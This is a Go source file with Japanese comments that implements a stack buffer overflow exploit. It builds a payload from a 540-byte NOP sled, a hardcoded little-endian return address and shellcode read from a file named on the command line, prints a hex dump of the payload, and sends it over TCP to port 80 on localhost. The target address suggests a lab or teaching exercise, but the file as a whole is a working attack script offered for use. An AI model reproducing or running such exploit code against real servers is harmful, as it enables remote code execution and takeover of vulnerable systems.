package main

import (
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"net"
	"os"
)

func main() {
	// コマンドライン引数として攻撃用スクリプトの種類を指定できる
	flag.Parse()

	if flag.Arg(0) == "" {
		fmt.Println("how to use: ./<this> <shellcode to use>")
		return
	}

	// TCPコネクションを張る
	conn, err := net.Dial("tcp", "127.0.0.1:80")
	if err != nil {
		panic(err)
	}
	defer conn.Close()

	// ペイロードを作成
	payload, err := makePayload(0xffffd460, 540, flag.Arg(0))
	if err != nil {
		panic(err)
	}
	fmt.Println("攻撃用ペイロード：")
	dump(payload)

	// ペイロードを送信
	if _, err := conn.Write(payload); err != nil {
		panic(err)
	}
}

// addr:      攻撃対象のメモリの開始アドレス
// offset:    メモリの開始位置からリターンアドレスまのでoffset
// shellfile: シェルコードのファイル名
func makePayload(addr uint32, offset int, shellfile string) (payload []byte, err error) {
	// NOPスレッドで埋める
	payload = make([]byte, offset)
	for i := 0; i < offset; i++ {
		payload[i] = 0x90
	}

	// リターンアドレスをペイロードの最後に追加
	a := make([]byte, 4)
	binary.LittleEndian.PutUint32(a[0:], addr+uint32(offset/2)) // 攻撃ペイロードの半分の位置に遷移するようアドレスを設定
	payload = append(payload, a...)

	// シェルコードを記入
	gap := 50 // 攻撃ペイロードの半分の位置からシェルコードまでの距離
	shellcode, err := os.ReadFile(shellfile)
	if err != nil {
		return payload, err
	}
	if len(shellcode)+gap > offset/2 {
		return payload, errors.New("shllcode too large")
	}
	for i, s := range shellcode {
		payload[offset/2+gap+i] = s
	}

	// 末尾に終端文字を追加
	payload = append(payload, []byte("\r\n")...)

	return
}

// ペイロードをダンプする
func dump(payload []byte) {
	for i, v := range payload {
		// 16進数表示
		fmt.Printf("%02x ", v)

		// 行末の処理(16byteごとに改行する)
		if (i%16 == 15) || (i == len(payload)-1) {
			// 最終行で16byteに満たない分の埋め草
			for j := 0; j < 15-(i%16); j++ {
				fmt.Printf("   ")
			}
			fmt.Printf("| ")

			// 印字可能な文字を表示
			for j := (i - (i % 16)); i >= j; j++ {
				p := payload[j]
				if (p > 31) && (p < 127) {
					fmt.Printf("%c", rune(p))
				} else {
					fmt.Print(".")
				}
			}
			fmt.Println()
		}
	}
}
